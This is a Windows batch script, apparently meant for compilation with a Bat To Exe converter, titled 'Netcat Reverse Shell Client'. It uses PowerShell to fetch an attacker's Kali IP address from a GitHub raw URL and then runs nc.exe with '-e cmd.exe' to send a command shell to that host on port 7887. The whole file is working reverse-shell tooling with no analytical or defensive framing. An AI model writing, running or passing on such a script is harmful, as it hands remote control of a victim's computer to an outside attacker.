::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSzk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFA9dXhCKAES0A5EO4f7+086CsUYJW/IDa4zJ06Sac64W8kCE
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
title Netcat Reverse Shell Client
color 0a

:: === CONFIG ===
:: Use the RAW URL from GitHub or Pastebin that contains only your Kali IP
set IPURL=https://raw.githubusercontent.com/loganstarkkali/payloads/main/myipaddress

:: Port where Kali is listening
set PORT=7887

:: Path to nc.exe (use absolute path to be safe after conversion)
set NCPATH=%~dp0nc.exe

:: Temp file to hold IP
set TEMPIP=%TEMP%\kali_ip.txt

:: === FETCH IP ===
echo [*] Downloading Kali IP from %IPURL%
powershell -Command "Invoke-WebRequest -Uri '%IPURL%' -OutFile '%TEMPIP%' -UseBasicParsing" || (echo [!] Download failed & pause & exit /b)

:: === READ IP ===
set /p FULLIP=<%TEMPIP%
if "%FULLIP%"=="" (
    echo [!] No IP found in downloaded file.
    pause
    exit /b
)

:: === CONNECT ===
echo.
echo [+] Connecting to %FULLIP% on port %PORT% ...
echo.
"%NCPATH%" %FULLIP% %PORT% -e cmd.exe

echo.
echo [!] Connection closed or failed.
pause
